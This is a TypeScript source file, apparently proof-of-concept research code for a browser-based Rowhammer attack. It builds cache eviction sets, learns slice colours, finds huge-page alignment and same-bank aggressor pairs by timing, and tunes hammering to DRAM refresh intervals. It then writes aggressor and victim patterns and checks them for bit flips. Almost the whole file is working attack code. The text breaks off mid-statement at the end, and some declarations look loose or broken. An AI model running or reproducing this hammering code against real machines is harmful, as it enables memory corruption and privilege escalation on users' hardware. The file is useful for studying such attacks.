/// <reference path="./models/BankStats.ts" />
/// <reference path="./models/EvictionSet.ts" />
/// <reference path="./models/LLCInfo.ts" />
/// <reference path="./models/Exploit.ts" />
/// <reference path="./utils/PRNG.ts" />
/// <reference path="./utils/Helpers.ts" />
/// <reference path="./utils/Loggers.ts" />

/* --- Constants --- */
const gb: number = 2 ** 30;
const mb: number = 2 ** 20;
const kb: number = 2 ** 10;

const bufSizeInPages = 14;
const bufSize = bufSizeInPages * 4 * kb;
const bufsPerSlab = 252 / bufSizeInPages;

const flushBufferSize = 32 * mb;

const VERBOSE: boolean = false;
const PRETEND: boolean = false;
const MAX_UNIQUE_LANES: number = 3; /* A, B, C, for non-uniformity */
const MIN_REPS_PER_REF: number = 4;

const __DATA_PATTERNS: number = [0xaaaaaaaa, 0x55555555];
const NUM_MASKS: number = (4 * kb) / 4;

let DATA_PATTERN: number = __DATA_PATTERNS[0];

const PAGE_SIZE: number = 2 * mb;

const NUM_LINE_BITS: number = 6; /* Cache line size in bits */
const NUM_BUS_BITS: number = 3; /* Bus/chip offset */

const HUGEPAGES: number = 500;
const HUGE_PAGE_MASK: number = 2 * mb - 1;
const PAGES: number = HUGEPAGES * 512;

/* Debug mode: requires maps.py to run in parallel */
const RUSH: boolean = true;
const __FAST: boolean = false;

/* --- Initialization --- */
let timeZero = performance.now();
const firstTimeZero = timeZero;

/* We sometimes assign to dummy to avoid assignment being optimized away */
var dummy = new Uint8Array(new ArrayBuffer(4 * kb));
var flushBuffer: Uint8Array = null;

/* buf8 and buf64 will be our playgrounds */
var buf8: Uint8Array = null;
var buf9: Uint8Array = null;

var bufPlaza = [];
var bufPlaza32 = [];

/**
 * Page offset to buffer offset (formerly otoi)
 *
 * @param {number} o/pa - Huge page offset
 * @param {number} h - Huge page index
 * @returns {number} - Offset in buffer
 */
function ptob(p: number, h: number, hugePageAtPages: number[]): number {
  return hugePageAtPages[h] * 4 * kb + p;
}

function pwraps(p: number, boundary: number): number {
  return p - boundary * 4 * kb < 0;
}

const physBlockSize = 256 * 4 * kb;

/* This is painful */
function ptophys(p: number, boundary: number): number {
  p = p - boundary * 4 * kb;

  /* The + physBlockSize is to avoid negative numbers */
  p = (p + physBlockSize) % physBlockSize;

  assert((p & mb) === 0);

  return p;
}

function phystop(phys: number, boundary: number, above: boolean): number {
  if (above) {
    let p: number = boundary * 4 * kb + phys;
    return p < 252 * 4 * kb ? p : -1;
  } else {
    let p: number = (boundary - 256) * 4 * kb + phys;
    return p >= 0 ? p : -1;
  }
}

/**
 * Buffer offset to page offset (formerly itoo)
 *
 * @param {number} i - Offset in buffer
 * @returns {number} - Huge page offset
 */
function btop(b: number, hugePageAtPages: number[]): number {
  let x: number = b - hugePageAtPages[0] * 4 * kb;
  let p = x & HUGE_PAGE_MASK;
  let h = (x - p) / (2 * mb);
  assert((x - p) % (2 * mb) === 0);
  return { h: h, p: p };
}

/**
 * Returns a subset of addresses that fall into the same slice
 *
 * @param{number} h - The index of the huge page in hugePageAtPages
 * @param{number} slice - The targeted slice index
 * @returns {Array<number>} - Addresses of the desired slice
 */
function getSameSlice(
  h: number,
  hugePageAtPages: number[],
  slice: number,
  li: LLCInfo,
): number[] {
  let subSet = [];

  /* Don't change the set, check for same slice */
  for (let p = 0; p < 2 * mb; p += 2 ** (li.numSetBits + NUM_LINE_BITS)) {
    if (li.ptosl(p) === slice) {
      subSet.push(ptob(p, h, hugePageAtPages));
    }
  }

  assert(subSet.length === li.numSameSliceOffsetsPerHugePage);

  return subSet;
}

function getSameSliceMB(
  boundary: number,
  slice: number,
  wrap: boolean,
  returnPhysical: boolean,
  li: LLCInfo,
): number[] {
  let subSet: number[] = [];

  /* Don't change the set, check for same slice. Use 4 kB for more precision */
  for (let p = 0; p < 252 * 4 * kb; p += 4 * kb) {
    if (pwraps(p, boundary) != wrap) continue;

    let phys: number = ptophys(p, boundary);

    if (phys >= 0 && li.ptosl(phys) === slice && li.ptose(phys) === 0) {
      if (returnPhysical) {
        subSet.push(phys);
      } else {
        subSet.push(p);
      }
    }
  }

  if (subSet.length === 2) {
    return subSet;
  } else if (!wrap) {
    return getSameSliceMB(boundary, slice, !wrap, returnPhysical, li);
  } else {
    return [];
  }
}

function buildEvictionSet(
  es: EvictionSet,
  hugePageAtPages: number[],
  li: LLCInfo,
  contiguous: boolean,
) {
  /*
   * Permutation and huge page to slice. Just takes the right three bits of the
   * permutation number @p. Wouldn't work if the number of slices would not be
   * a power of two!
   */
  function perhtosl(per: number, h: number) {
    return (per >> (3 * h)) & 0x7; /* 0x7 = 0111 */
  }

  es.addrs = es.addrs.fill(
    0,
    0,
    li.numHugePagesPerEvictionSet * li.numSameSliceOffsetsPerHugePage,
  );

  let sum: number = 0;
  let fast: boolean = false;

  if (contiguous) {
    /*
     * These worked for contiguous memory. Used to detect the PFN boundary. Not
     * 100% reliable
     */
    perms = [189, 1049, 1638, 3046];
  } else {
    /*
     * Test each possible permutation, e.g., 8^5 = 32'768 combinations.
     *
     * A permutation is a set of 5 huge pages. Of all these permutations, in one
     * case they all have the same color. That's the case we're looking for
     */
    perms = Array.from(
      { length: li.numSlices ** li.numHugePagesPerEvictionSet },
      (_, i) => i,
    );
    fast = true;
  }

  for (const per of perms) {
    /* Permute the huge page offset of each THP and update the eviction set. */
    for (let h: number = 0; h < li.numHugePagesPerEvictionSet; h++) {
      /*
       * This effectively "colours" each huge page. Chooses a perceived slice
       * for each of them
       */
      let s: number = perhtosl(per, h);

      es.addrs.splice(
        h * li.numSameSliceOffsetsPerHugePage /* Index to replace at */,
        li.numSameSliceOffsetsPerHugePage /* Num. elements to replace */,
        ...getSameSlice(
          h,
          hugePageAtPages,
          s,
          li,
        ) /* New elements (unpacked) */,
      );
    }

    let y = es.evicts([], fast, null);

    sum += y.median;

    if (VERBOSE || y.evicts) {
      console.log(
        `hp: ${__pfst(per, 0, 5)}/${__pfst(
          li.numSlices ** li.numHugePagesPerEvictionSet,
          0,
          5,
        )}: median/base/?: ${__pfst(y.median, 3, 1)}/${__pfst(
          es.baseline,
          3,
          1,
        )}/${y.evicts}`,
      );
    }

    if (y.evicts) {
      if (VERBOSE || true) {
        for (let h = 0; h < li.numHugePagesPerEvictionSet; h++) {
          console.log(
            "permutation=" + per.toString(2),
            "hugepage=" + h,
            "sliceIdx=" + perhtosl(per, h),
          );
        }
      }

      /* Let's keep going!? */
      return 0;
    } else if (!(per < 4096)) {
      /*
       * Among the 8^5 there are eight that work. Should have found one by now
       */
      return sum;
    } else if (contiguous) {
      /* One try per slice, though one should be enough */
      return sum;
    }
  }

  return sum;
}

const randElement = (xs) => xs[getRandomInt(0, xs.length)];

/*
 * for (const ratio of [2, 3, 5]) {
 *   for (const expansion of [1, 2, 4]) {
 *     for (const ax of [0x1, 0x101, 0x841]) {
 *       for (const ay of [0x841, 0x1111, 0x2491]) {
 *         for (const tREFIs of [9, 17, 33]) {
 */
function makeDoubleSpaceIterator(
  ratio: number[],
  expansion: number[],
  assemblyX: number[],
  assemblyY: number[],
  nonUniformities: number[][],
  tREFIs: number[],
) {
  let index: number = 0;
  const max: number = 4;

  const doubleSpaceIterator = {
    next() {
      index++;

      if (index <= max) {
        return {
          value: {
            ratio: randElement(ratio),
            expansion: randElement(expansion),
            assemblyX: randElement(assemblyX),
            assemblyY: randElement(assemblyY),
            nonUniformities: randElement(nonUniformities),
            tREFIs: randElement(tREFIs),
          },
          done: false,
        };
      } else {
        return { value: null, done: true };
      }
    },
  };

  return doubleSpaceIterator;
}

/*
 * for (const tREFIs of [13, 11, 9, 7, 5, 3, 2]) {
 *   for (const assembly of [0x2929, 0x2491, 0x1111, 0x841]) {
 *     for (const nonUniformity of [3, 2, 1]) {
 */
function makeHSpaceIterator(
  tREFIs: number[],
  assembly: number[],
  nonUniformity: number[],
) {
  let index: number = 0;
  /* Shouldn't matter!? Hmmm. */
  const max: number = 16;

  const hspaceIterator = {
    next() {
      index++;

      if (index <= max) {
        return {
          value: {
            tREFIs: randElement(tREFIs),
            assembly: randElement(assembly),
            nonUniformity: randElement(nonUniformity),
          },
          done: false,
        };
      } else {
        return { value: null, done: true };
      }
    },
  };

  return hspaceIterator;
}

function makeSliceIterator(li: LLCInfo) {
  let index: number = 0;
  const max: number = li.numSlices;

  const sliceIterator = {
    next(matches: number[]) {
      index++;

      return { value: matches.map((x) => (x + 1) % li.numSlices), done: false };
    },
  };

  return sliceIterator;
}

function slabOffsetToBuf(p: number) {
  let y = Math.floor(p / bufSize);
  assert(y === y % bufsPerSlab);
  return y;
}

const countOccurence = (x: number, xs: number[]) => {
  return xs.filter((y) => y === x).length;
};

function sliceMatcherMB(
  es: EvictionSet,
  nestedBuffer: number[][],
  slabIdx: number,
  bs: bankStats,
  li: LLCInfo,
): Array<number> {
  /* Just for this function */
  const FAST: boolean = __FAST;
  const DBG: boolean = false;

  let testSet = new EvictionSet(li.wayness);

  /*
   * Not used anymore, we simply start at the end, was used to select one:
   * if (!(slab >= slabIdx - 5 && slab < slabIdx + 5)) continue;
   */
  assert(slabIdx === 0);
  assert(bufsPerSlab === 18);
  print(nestedBuffer.length, bufsPerSlab);
  assert(nestedBuffer.length % bufsPerSlab === 0);

  /*
   * Contains, for each slab, the boundary. Slice will have to be brute-forced
   * later
   */
  let matches = new Array(nestedBuffer.length / bufsPerSlab).fill(null);

  assert(nestedBuffer.length % bufsPerSlab === 0);

  let count: number = 0;
  let cache = new Map();

  for (let i = nestedBuffer.length - bufsPerSlab; i >= 0; i -= bufsPerSlab) {
    /*
     * For debugging:
     *
     * for (
     *   let i = nestedBuffer.length - 970 * bufsPerSlab;
     *   i >= 0;
     *   i -= bufsPerSlab
     * ) {
     */
    assert(i % bufsPerSlab === 0);

    let slab = i / bufsPerSlab;
    let actualBoundary = nestedBuffer[i][1];

    if (slab < 9000 && !count) {
      print("no contiguous memory? aborting...");
      assert(0);
    }

    /* Only available when rushing */
    let pfn =
      nestedBuffer[i][2] ^
      (nestedBuffer[i][3] << 8) ^
      (nestedBuffer[i][4] << 16) ^
      (nestedBuffer[i][5] << 24);

    /* Speed */
    if (FAST && !actualBoundary) continue;

    print(slab, actualBoundary, pfn.toString(16));

    if (actualBoundary === 0) actualBoundary = -1;

    let xors: number[] = [];
    let slices: number[] = [];
    let candidates: number[] = [];
    let preCandidates: number[] = [];

    /* Boundary: this wraps at 64, see the break below (old) */
    for (let s: number = 0; s < li.numSlices; s++) {
      /* Probably not contiguous: not sure */
      if (!FAST && s >= 3 && !preCandidates.length) break;

      for (let b: number = 0; b < 252; b++) {
        /* Speed mode */
        if (FAST && b !== actualBoundary) continue;

        if (preCandidates.length && !preCandidates.includes(b)) continue;

        let key = `${s}${b}`;
        let subSet: number[] = null;

        /* Doesn't make it faster, really */
        if (cache.has(key)) {
          subSet = cache.get(key);
        } else {
          subSet = getSameSliceMB(b, s, false, false, li);
          cache.set(key, subSet);
        }

        if (subSet.length === 2) {
          const bufs: number[][] = subSet.map(
            (p) => nestedBuffer[i + slabOffsetToBuf(p)],
          );

          const bufIdxsDebug: number[] = subSet.map(
            (p) => i + slabOffsetToBuf(p),
          );

          assert(bufIdxsDebug.length === 2);

          /* Original offsets, used later to recompute the physical addrs. */
          const ps: number[] = [...subSet];

          subSet = subSet.map((p) => p % bufSize);
          subSet.forEach((p) => assert(p >= 0 && p < bufSize));
          subSet.map((p) => assert(p % (4 * kb) === 0));

          if (subSet[0] === subSet[1]) {
            assert(ps[0] != ps[1]);
          }

          subSet.sort((a, b) => a - b);

          for (let c: number = 0; c < es.colors.length; c++) {
            /*
             * if (c != 0) break;
             * if (!(xor === -1 || (s ^ c) === xor)) break;
             */
            es.setColor(c);
            testSet.addrs = [...es.addrs];
            testSet.addrs.splice(0, 2, ...subSet);

            /*
             * Was used for debugging: to see what we're accessing
             *
             * for (let z = 0; z < 2; z++) {
             *   bufs[z][subSet[z]] = 0x3c;
             *   bufs[z][subSet[z] + 1] = 0xc4;
             * }
             */
            let y = testSet.evicts(bufs, true, null);

            if (y.median > 2 * testSet.baseline) {
              let banks: number[] = ps.map((p) => bs.ptoba((pfn << 12) + p));

              xor = s ^ c;

              slices.push(c === 0 ? s : -1);
              xors.push(xor);
              candidates.push(b);

              if (!preCandidates.length) {
                /* Don't ask me why; empirical evidence */
                for (let diff = 0; diff < 256; diff += 16) {
                  preCandidates.push((b + diff) % 256);
                }
              }

              if (DBG) {
                print(
                  s,
                  c,
                  xor,
                  Math.abs(b - actualBoundary)
                    .toString()
                    .padStart(3, "0"),
                  banks.map((b) => b.toString().padStart(2, "0")),
                  actualBoundary === b ? "OK" : "false",
                  b,
                  actualBoundary,
                  y.median,
                );
              }
            }
          }
        }
      }
    }

    let threshold: number = FAST ? 1 : 2;

    if (!(candidates.length >= threshold)) continue;

    let counts: number[] = candidates.map((x, i, xs) => countOccurence(x, xs));

    candidates = candidates.filter((x, i) => counts[i] === Math.max(...counts));
    xors = xors.filter((x, i) => counts[i] === Math.max(...counts));
    slices = slices.filter((x, i) => counts[i] === Math.max(...counts));

    if (
      candidates.length >= threshold &&
      [...new Set(candidates)].length === 1 &&
      [...new Set(xors)].length === 1
    ) {
      let b: number = candidates[0];

      slices = slices.filter((x) => x !== -1);

      if (slices.length) {
        if (b !== actualBoundary && actualBoundary !== -1) {
          print("think", b, "should be", actualBoundary);
        }

        print("boundary at", b, "for slice", slices[0]);
        matches[slab] = [b, slices[0], pfn];
        count++;
      }
    }
  }

  return matches;
}

function sliceMatcher(
  es: EvictionSet,
  hugePageAtPages: number[],
  li: LLCInfo,
): Array<number> {
  console.log("[>] Learning slice color of " + HUGEPAGES + " huge pages... ");
  let testSet = new EvictionSet(li.wayness);

  testSet.addrs = [...es.addrs];

  /*
   * Contains, for each huge page, the "slice correction" (say, virtual slice)
   * that when applied, gives it the same physical slice (colour) as all other
   * pages
   */
  let matches = new Array(hugePageAtPages.length);

  /*
   * The eviction set we already found clearly has 5 pages of the same color.
   *
   * We only try permutations of the first five huge pages!
   */
  for (let h: number = 0; h < li.numHugePagesPerEvictionSet; h++) {
    matches[h] = li.ptosl(
      btop(es.addrs[h * li.numSameSliceOffsetsPerHugePage], hugePageAtPages).p,
    );
  }

  for (
    let h: number = li.numHugePagesPerEvictionSet;
    h < hugePageAtPages.length;
    h++
  ) {
    let foundColour = false;

    while (!foundColour) {
      for (let s: number = 0; s < li.numSlices; s++) {
        /*
         * Replace the first numOffsetsPerPage of the eviction set and try to
         * restore eviction
         */
        testSet.addrs.splice(
          0,
          li.numSameSliceOffsetsPerHugePage,
          ...getSameSlice(h, hugePageAtPages, s, li),
        );

        let y = testSet.evicts();

        console.log(
          `h ${h}, s ${s}: ${__pfst(y.median, 2, 2)} < ${__pfst(testSet.baseline, 2, 2)}`,
        );

        if (y.evicts) {
          foundColour = true;
          matches[h] = s;
          break;
        }
      }
    }
  }

  return matches;
}

function haveSameBank(m: number, referenceMedians: number[]) {
  let max = Math.max(...referenceMedians);
  let min = Math.min(...referenceMedians);
  let diff = (max - min) / 4;

  if (!referenceMedians.length) {
    return false;
  } else if (Math.abs(max - m) < diff) {
    return true;
  } else if (Math.abs(min - m) <= diff) {
    return false;
  } else {
    return false;
  }
}

function sameBankTest(
  addr: number[],
  bddr: number[],
  nestedBuffer: number[][],
  bs: BankStats,
  li: llcInfo,
  __es: EvictionSet,
  testSet: EvictionSet,
  __referenceMedians: number[],
) {
  const FAST: boolean = __FAST;

  const [h, pfn, __, p] = addr;
  const [__h, __pfn, ____, q] = bddr;

  let realBank = bs.ptoba((pfn << 12) + p);
  let otherRealBank = bs.ptoba((__pfn << 12) + q);

  if (FAST) return realBank === otherRealBank ? 1 : 0;

  let subSet: number[] = [p, q, 0];

  /* Cannot have three elements!? */
  const bufIdxs: number[] = [
    h * bufsPerSlab + slabOffsetToBuf(p),
    __h * bufsPerSlab + slabOffsetToBuf(q),
  ];

  subSet = subSet.map((p) => p % bufSize);

  /* First, eviction */
  __es.setColor(0);
  testSet.addrs = [...__es.addrs];
  testSet.addrs.splice(0, 2, ...subSet.slice(0, 2));

  let evictResult = testSet.evicts(
    bufIdxs.map((x) => nestedBuffer[x]),
    false,
    null,
  );
  let baseline = testSet.baseline;

  testSet.addrs = [...__es.addrs];
  testSet.addrs.splice(testSet.sizeWhenMinimal, 2, ...subSet);

  assert(bufIdxs.length === 2);

  let bankResult = testSet.evicts([bufIdxs], false, nestedBuffer);

  print(
    "\t",
    (otherRealBank === realBank).toString().padStart(5, " "),
    haveSameBank(bankResult.median, __referenceMedians)
      .toString()
      .padStart(5, " "),
    baseline.toFixed(3).toString().padStart(6, " "),
    evictResult.median.toFixed(3).toString().padStart(6, " "),
    "|",
    bankResult.median.toFixed(3).toString().padStart(6, " "),
    realBank.toString().padStart(2, " "),
    otherRealBank.toString().padStart(2, " "),
  );

  return bankResult.median;
}

function getSetPairsMB(
  pairs: number,
  matches: number[],
  nestedBuffer: number[][],
  bs: bankStats,
  li: llcInfo,
  __es: EvictionSet,
): EvictionSet[] {
  let result: EvictionSet[] = [];
  let size: number = li.wayness * MAX_UNIQUE_LANES;

  const FAST: boolean = __FAST;

  const slack = 4;

  assert(pairs === 2);

  const collectThreshold = 32;
  let bankMedians: number[] = [];
  let testSet = new EvictionSet(li.wayness);
  let pool = [];

  for (let h = 0; h < matches.length; h++) {
    if (matches[h] === null) continue;

    const [b, s, pfn] = matches[h];
    let psx: number[] = getSameSliceMB(b, s, false, true, li);
    assert(psx.length === 2);

    let ps: number[] = getSameSliceMB(b, s, false, false, li);
    assert(ps.length === 2);

    pool.push(...ps.map((p, i) => [h, pfn, psx[i], ps[i]]));
  }

  print("pool has", pool.length);

  bankMedians = pool
    .slice(0, collectThreshold)
    .map((addr) =>
      sameBankTest(
        addr,
        pool[collectThreshold],
        nestedBuffer,
        bs,
        li,
        __es,
        testSet,
        bankMedians,
      ),
    );

  /* First one is typically bad */
  bankMedians = bankMedians.slice(1, bankMedians.length);

  print("bank medians", bankMedians);

  let leadingAddress = getRandomInt(0, pool.length);
  let filteredPool = [];

  for (const [i, addr] of pool.entries()) {
    if (i === leadingAddress) {
      filteredPool.push(addr);
    } else {
      let tmp = sameBankTest(
        pool[leadingAddress],
        addr,
        nestedBuffer,
        bs,
        li,
        __es,
        testSet,
        bankMedians,
      );

      if (!FAST) {
        if (haveSameBank(tmp, bankMedians)) filteredPool.push(addr);
      } else if (FAST && tmp === 1) {
        filteredPool.push(addr);
      }
    }
  }

  pool = [...filteredPool];
  let count = pool.length;

  print("got count", count, "need", size * pairs - slack);

  if (!(count >= size * pairs - slack)) return [];

  for (const [h, pfn, px, p] of pool) {
    print("got", bs.ptoba((pfn << 12) + p), p);
  }

  let half = Math.floor(count / 2);

  /*
   * TODO: old stuff, parked
   *
   * let freeMask =
   *   bs.columnMask & ~bs.bankFunctions.reduce((l, r) => l | r) & li.setMask;
   * let randomMask = getRandomInt(1, 1 << nzb(freeMask)) << tzb(freeMask);
   * esx.addrs = esx.addrs.map((b) => b ^ randomMask);
   */

  for (let i = 0; i < pairs; i++) {
    let esx = new EvictionSet(li.wayness);
    let esy = new EvictionSet(li.wayness);

    esx.addrs = pool.slice(i * half, i * half + half);

    shuffle(esx.addrs);

    let y = esx.evictsNested(nestedBuffer);

    print(`baseline ${esx.baseline} and median ${y.median}`);

    if (!y.evicts) return [];

    print("slab,pfn,px,p,bank-guess,bank-real");

    esx.addrs = esx.addrs.filter((x) => x.length > 0);

    y = esx.evictsNested(nestedBuffer);

    print(`baseline ${esx.baseline} and median ${y.median} (post filter)`);

    print("slab,boundary,px,p,qx,q,bank-real");

    for (const [h, pfn, px, p] of esx.addrs) {
      let b = matches[h][0];
      assert(b >= 0);
      let qx = bs.mutateRowPreserveBank(px);
      assert(qx >= 0 && qx < physBlockSize);
      let q = phystop(qx, b, p >= b * 4 * kb);
      print(
        h,
        b,
        px,
        p,
        bs.ptoba((pfn << 12) + p),
        bs.ptoro((pfn << 12) + p),
        " | ",
        qx,
        q,
        bs.ptoba((pfn << 12) + q),
        bs.ptoro((pfn << 12) + q),
      );
      esy.addrs.push([h, pfn, qx, q]);
    }

    esx.addrs = esx.addrs.filter((x, i) => esy.addrs[i][3] != -1);
    esy.addrs = esy.addrs.filter((x) => x[3] != -1);

    y = esx.evictsNested(nestedBuffer);

    print(`esx: baseline ${esx.baseline} and median ${y.median}`);

    let z = esy.evictsNested(nestedBuffer);

    print(`esy: baseline ${esy.baseline} and median ${z.median}`);

    if (!y.evicts || !z.evicts) return [];

    if (esx.addrs.length < size - nzb(0x2491)) return [];

    const need: number = size - esx.addrs.length;

    /* Dummies that should never be used */
    for (let d = 0; d < need; d++) {
      esx.addrs.push([-1, -1, -1, -1]);
      esy.addrs.push([-1, -1, -1, -1]);
    }

    print("final result", esx.addrs.length, esy.addrs.length);

    print("esx");
    for (const [h, pfn, px, p] of esx.addrs) {
      print(h, pfn.toString(16), px, p);
    }

    print("esy");
    for (const [h, pfn, qx, q] of esy.addrs) {
      print(h, pfn.toString(16), qx, q);
    }

    /* We only push @esx, which is now paired to @esy */
    esx.pair(esy);
    result.push(esx);
  }

  return result;
}

function getSetPairs(
  pairs: number,
  bank: number,
  matches: number[],
  hugePageAtPages: number[],
  bs: bankStats,
  li: llcInfo,
): EvictionSet[] {
  let result: EvictionSet[] = [];
  const size: number = li.wayness * MAX_UNIQUE_LANES;

  for (let i = 0; i < pairs; i++) {
    let count = 0;

    let esx = new EvictionSet(li.wayness);
    let esy = new EvictionSet(li.wayness);

    for (let h = 0; h < hugePageAtPages.length; h++) {
      let addrsFromPage = getSameSlice(h, hugePageAtPages, matches[h], li);
      assert(addrsFromPage.length === li.numSameSliceOffsetsPerHugePage);
      addrsFromPage = addrsFromPage.filter(
        (b) => bs.ptoba(btop(b, hugePageAtPages).p) === bank,
      );
      esx.addrs = esx.addrs.concat(addrsFromPage);
      count += addrsFromPage.length;
    }

    assert(count >= size * pairs);

    shuffle(esx.addrs);

    /* Randomize the set by changing the column bits that are not bank bits */
    let freeMask =
      bs.columnMask & ~bs.bankFunctions.reduce((l, r) => l | r) & li.setMask;
    let randomMask = getRandomInt(1, 1 << nzb(freeMask)) << tzb(freeMask);

    esx.addrs = esx.addrs.map((b) => b ^ randomMask);

    /* This is where slice and how we create multiple set pairs */
    esx.addrs = esx.addrs.slice(i * size, i * size + size);

    if (!esx.evicts().evicts) return [];

    for (const addr of esx.addrs) {
      let x = btop(addr, hugePageAtPages);
      let b = ptob(bs.mutateRowPreserveBank(x.p), x.h, hugePageAtPages);
      esy.addrs.push(b);
    }

    if (!esy.evicts().evicts) return [];

    /* We only push @esx, which is now paired to @esy */
    esx.pair(esy);
    result.push(esx);
  }

  return result;
}

/**
 * Computes the 4K pages that correspond to the huge pages by taking the
 * previously determined offset into account.
 *
 * For example, "256, 768" means that the first huge page
 * starts at page 256 (i.e., 1 MiB) and the second huge page at page 768 (i.e.,
 * 3 MiB).
 *
 * @param {number} offset - The offset where the huge pages start in the buf8 buffer.
 * @returns {Array} - The pages corresponding to the numHugePages huge pages.
 */
function computeHugePagesAtPages(offset: number): number[] {
  let offsetToPage = Math.round((offset * mb) / (4 * kb));

  let hugePageAtPages = Array.from({ length: HUGEPAGES }, (_, i) => {
    return offsetToPage + i * 512;
  });

  assert(
    hugePageAtPages.length == HUGEPAGES,
    "hugePageAtPages should have length equal to numHugePages",
  );

  return hugePageAtPages;
}

function populate(xs: number[]) {
  for (let i = 0; i < xs.length; i += 4 * kb) {
    xs[i] = (i % 255) + 1;
  }
}

/**
 * Populates the `buf8` array such that accesses either fall on two 4K pages
 * (i.e., cause two page faults: slow) or on the same huge page (i.e., one
 * page fault: fast). This is used to detect whether the first huge page in our
 * buffer starts at either offset 0 or 1 MB
 *
 * @returns {number} The time taken to populate the array.
 */
function amplifiedPopulate(): number {
  let before = performance.now();

  for (let i = 0; i < 250; i++) {
    let j = 1.5 * mb + i * 4 * mb;
    buf8[j] = j;
    buf8[j + mb] = j + mb;
  }

  let after = performance.now();
  return after - before;
}

/**
 * Measures the access time for accessing pages at random offsets.
 *
 * @param {number} start_offset_kb - The starting offset in kilobytes.
 * @param {number} num_tests - The number of pages to access.
 * @returns {number} - The time taken to access the pages in milliseconds.
 */
function measureAccessTime(start_offset_kb: number, num_tests: number): number {
  // Generate page addresses with random within-page offsets.
  let indices = [];
  for (let i = 1; i < num_tests; i++) {
    indices.push(i * 4 * kb + getRandomInt(0, 3));
  }
  shuffle(indices);

  // Access page while measuring access time.
  let before = performance.now();
  for (let i = 0; i < num_tests; i++) {
    let j = start_offset_kb + 2 * kb + indices[i];
    buf8[j] = i;
  }
  return performance.now() - before;
}

/**
 * Determines the page alignment, i.e., the number of megabytes before the first
 * huge page in the buf8 buffer.
 *
 * @returns {number} The page alignment value: 0 (MiB) or 1 (MiB).
 */
function detectPageAlignment(): number {
  let offset;

  if (UARCH == UARCHS.KABY) {
    /* Typically either ~42/~86 */
    let time = amplifiedPopulate();
    offset = time > 70 ? 0 : 1;
    console.log(`[>] Detecting page alignment... ${__pfst(time, 0, 2)} < 70?`);
  } else if (UARCH == UARCHS.COFFEE) {
    /* We check 256 pages as 256 x 4KiB = 1MiB and we found that 1 MiB is the
     * boundary where we typically see the first huge page.
     * It is unclear why but turning these two rows around reduces the difference
     * between t1 and t2 (but still t2 is faster than t1) - prefetching maybe? */
    let t1 = measureAccessTime(0, 256);
    let t2 = measureAccessTime(1 * mb, 256);
    offset = t1 > t2 * 1.5 ? 1 : 0;
  } else {
    throw new Error("Unknown architecture");
  }

  console.log(`[>] First huge page is at buffer offset ${offset} MiB`);
  return offset;
}

/***
 *
 */
function determineNumXORs(
  evictionSet: EvictionSet,
  assembly: Assembly,
  singleBankAggressors: number[],
): number {
  const ratioEpsilon = 0.02;
  const ratioTarget = 2.5;
  const minXORstep = 20;

  let initialNumberOfXORs = 1000;
  let XORstep = 100;

  console.log("[>] Soft sync... (XORs, tREFI/t)");

  while (true) {
    let selectionPairsIdxs = aggressorSelection(
      0,
      evictionSet.addrs.length,
      assembly.numHitPairs + assembly.numPairs,
    );
    let selectionIdxs = interleave(
      selectionPairsIdxs[0],
      selectionPairsIdxs[1],
    );
    printAddresses(
      selectionIdxs.map((i) => evictionSet.addrs[i]),
      "aggressorSelection",
      DBG_PRINT_EVICTION_SETS,
    );

    let pattern = buildAny(selectionIdxs, evictionSet.addrs, assembly);
    install(pattern);

    let ratio = hammerBench(0, singleBankAggressors, initialNumberOfXORs);
    console.log(`(${initialNumberOfXORs}, ${ratio})`);

    let diff = Math.abs(Math.round(ratio) - ratio);
    if (diff <= ratioEpsilon || Math.abs(diff - 0.5) <= ratioEpsilon) {
      break;
    }

    /* Check if we are too fast (increase XORs) or too slow (decrease XORs). */
    XORstep = Math.max(Math.round(XORstep * 0.8), minXORstep);
    initialNumberOfXORs += ratio > ratioTarget ? XORstep : -XORstep;

    if (initialNumberOfXORs < 0) {
      initialNumberOfXORs = 0;
      break;
    }
  }
  return initialNumberOfXORs;
}

function sync(
  hammer: (xors: number, refIters: number[], amp: number) => number,
  chaseLengths: number[],
  repsPerREFs: number[],
  tREFIs: number,
) {
  let xors: number = 0;
  let squeeze: boolean = true;

  const factor: number = 1;
  const ns: number = tREFIs * (78 * factor);

  while (true) {
    /* 7800 ns -> 7.8 us -> *1000 -> 7.8 ms -> *10 -> 78 ms */
    /* 7800 ns -> 7.8 us -> *1000 -> 7.8 ms -> *100 -> 780 ms */
    const amp = factor * 10 ** 4; /* DON'T CHANGE */
    let before = performance.now();

    /* The actual set to hammer is passed through a closure */
    dummy[0] ^= hammer(
      xors,
      repsPerREFs.map((r, i) => r * chaseLengths[i]),
      amp,
    );

    let after = performance.now();
    let t = after - before;

    if (t < ns && squeeze) {
      repsPerREFs = repsPerREFs.map((x) => x + 2);
      print(
        "increasing...",
        __pfst(t / ns, 3, 4),
        ...repsPerREFs.map((x) => __pfst(x, 0, 2)),
      );
      continue;
    } else if (t > 2 * ns) {
      return null;
    } else if (t > 1.02 * ns) {
      squeeze = false;

      if (repsPerREFs.some((x) => x > MIN_REPS_PER_REF)) {
        repsPerREFs = repsPerREFs.map((x) =>
          x > MIN_REPS_PER_REF ? x - 1 : x,
        );
        print(
          "decreasing...",
          __pfst(t / ns, 3, 4),
          ...repsPerREFs.map((x) => __pfst(x, 0, 2)),
        );
        continue;
      } else {
        return null;
      }
    }

    let scale: number = 4 * ns;
    let add: number = scale * ((ns - (after - before)) / ns);

    if (Math.abs(add) <= 0.02 * scale) break;

    print(
      ...repsPerREFs.map((x) => __pfst(x, 0, 2)),
      __pfst(xors, 0, 5),
      "+" + __pfst(add, 0, 4),
      __pfst(t, 0, 5),
      __pfst(ns, 0, 5),
    );

    xors += add;
  }

  return { xors: xors, repsPerREFs: repsPerREFs };
}

/*
 * For debugging:
 * sets[0].printIterable(hugePageAtPages, li, bs);
 */
const setVictim = (b, column) => {
  assert(b % 4 === 0);
  b >>= 2;
  buf32[b] = DATA_PATTERN;
  assert(typeof buf32[b] === "number");
};

/*
 * For debugging:
 *
 * const printVictim = (b, column) => {
 *   assert(b % 4 === 0);
 *
 *   if (column === 0) {
 *     let x: number = btop(b, hugePageAtPages);
 *     print(
 *       "V",
 *       __pfst(bs.ptoba(x.p), 0, 2),
 *       __pfst(bs.ptoro(x.p), 0, 5),
 *       __pfst(x.h, 0, 3),
 *     );
 *   }
 * };
 */

const setAggressor = (b, column) => {
  assert(b % 4 === 0);
  b >>= 2;
  buf32[b] = DATA_PATTERN ^ 0xffffffff;
  assert(typeof buf32[b] === "number");
};

const checkVictim = (b, column) => {
  assert(b % 4 === 0);
  b >>= 2;

  if (buf32[b] !== DATA_PATTERN) {
    print(
      "csv:flp," +
